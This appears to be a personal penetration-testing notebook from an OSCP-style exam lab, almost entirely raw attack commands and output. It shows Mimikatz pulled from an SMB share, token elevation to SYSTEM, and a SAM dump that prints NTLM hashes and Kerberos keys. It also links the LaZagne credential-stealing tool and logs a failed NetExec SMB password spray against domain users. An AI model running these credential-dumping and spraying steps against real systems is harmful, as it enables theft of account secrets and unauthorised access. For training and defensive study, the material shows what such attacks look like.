# Mimikatz

```powershell
PS C:\Users\Administrator> net use \\192.168.49.104\share /user:username pw
The command completed successfully.

PS C:\Users\Administrator> cp \\192.168.49.104\share\mimikatz.exe .
PS C:\Users\Administrator> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # log logonpasswords.txt
Using 'logonpasswords.txt' for logfile : OK

mimikatz # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list

mimikatz # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

700     {0;000003e7} 1 D 43270          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;00e24f5d} 3 D 16065372    WS26\Administrator      S-1-5-21-2756297892-2186407355-380279769-500    (14g,25p)       Primary
 * Thread Token  : {0;000003e7} 1 D 16177523    NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

mimikatz # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list

mimikatz # lsadump::sam
Domain : WS26
SysKey : 6efca182500dc518f4c19cf5341a30d4
Local SID : S-1-5-21-2756297892-2186407355-380279769

SAMKey : 24426470f121aa90530be4b3c19d878b

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 6d2907763f2fdae4099a65bdb012045c
    lm  - 0: 407b7adefdd553a2de47fb9811116f29
    ntlm- 0: 6d2907763f2fdae4099a65bdb012045c
    ntlm- 1: 6d2907763f2fdae4099a65bdb012045c

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : e7d88aabdeda8a50b6c8bd4ea585dd44

* Primary:Kerberos-Newer-Keys *
    Default Salt : WS26.OSCP.EXAMAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : e9f31a70b7ddcdd063ba3f337a9d58bf2103f34602f47b51a57465253ab811bd
      aes128_hmac       (4096) : d936e790bfe354dc5357fbca7f15b778
      des_cbc_md5       (4096) : 9b98987002327fce
    OldCredentials
      aes256_hmac       (4096) : 18e95cb5dfb458db5c3202bdd5045ed141a70a2af39860d1042113ab3fa3f9ad
      aes128_hmac       (4096) : 45290fc8d9c01413cef0a27ccc91f347
      des_cbc_md5       (4096) : 5d8525c8d6ab9d52
    OlderCredentials
      aes256_hmac       (4096) : 53c7cdd42d708d6ec10e1c7814c62167bad6454ea6dc42d9e5c1bb8ab7b9d79d
      aes128_hmac       (4096) : ea7898e7e9d3e319005056b9e5f7dd43
      des_cbc_md5       (4096) : 91ce9dab57548f0b

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WS26.OSCP.EXAMAdministrator
    Credentials
      des_cbc_md5       : 9b98987002327fce
    OldCredentials
      des_cbc_md5       : 5d8525c8d6ab9d52


RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: 5403e400be738dd915e176be5da78216

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : aedf7c3484786b0b08c3cf5390100e59

* Primary:Kerberos-Newer-Keys *
    Default Salt : WDAGUtilityAccount
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : fde783dddc7dba274cdb578e91c742114e263fda3f85d2de370b2094d1de0bc0
      aes128_hmac       (4096) : ded4018116eea7e5616be59ae6ffe2e2
      des_cbc_md5       (4096) : eca497e5c275648c

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WDAGUtilityAccount
    Credentials
      des_cbc_md5       : eca497e5c275648c
      
mimikatz # sekurlsa::tickets /export
ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list
```

---

# Lazagne

- [Lazagne](https://github.com/AlessandroZ/LaZagne/releases/)



---

# Admin Password spray -> 失敗

```sh
┌──(koshi㉿kali)-[~/Exam/AD/AD_Common]
└─$ nxc smb $TargetIP -u usernames.txt -p CarHammerChip964 --continue-on-success
SMB         172.16.104.202  445    SRV22            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SRV22) (domain:oscp.exam) (signing:False) (SMBv1:False)
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\C.ROGERS@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\ADMINISTRATOR@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\U.GREGORY@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\C.DEAN@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\O.HUGHES@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\P.GETHIN@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\T.FUCHS@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\B.WILLIAMS@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\V.SKINNER@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\G.JARVIS@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\M.NEWMAN@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\J.KOLE@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\S.TUCKER@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\L.EVGENY@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\R.ANDREWS@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\R.GALLAGHER@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\S.FISCHER@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\K.FREEMAN@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\B.CROSS@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\E.DDWARDS@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\D.HALL@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\F.HATFIELD@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\B.MARTIN@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\V.PERRY@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\A.BAILEY@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\W.BYRD@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\IUSR@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 

```